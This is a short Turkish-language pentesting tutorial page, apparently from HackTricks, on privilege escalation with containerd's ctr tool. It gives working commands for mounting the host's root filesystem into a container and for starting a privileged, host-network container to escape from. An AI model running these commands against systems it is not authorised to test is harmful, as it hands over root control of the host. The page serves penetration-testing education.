# Containerd (ctr) Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

**containerd** ve `ctr`'nin **container stack içindeki yerini** öğrenmek için aşağıdaki bağlantıya gidin:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

bir host'un `ctr` komutunu içerdiğini tespit ederseniz:
```bash
which ctr
/usr/bin/ctr
```
Görselleri listeleyebilirsiniz:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Ve ardından **host'un root klasörünü içine mount ederek bu image'lerden birini çalıştırın**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Bir container'ı privileged olarak çalıştırın ve container'dan escape edin.\
Privileged bir container'ı şu şekilde çalıştırabilirsiniz:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Ardından, **ayrıcalıklı capabilities'leri kötüye kullanarak container'dan kaçmak** için aşağıdaki sayfada belirtilen bazı teknikleri kullanabilirsiniz:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
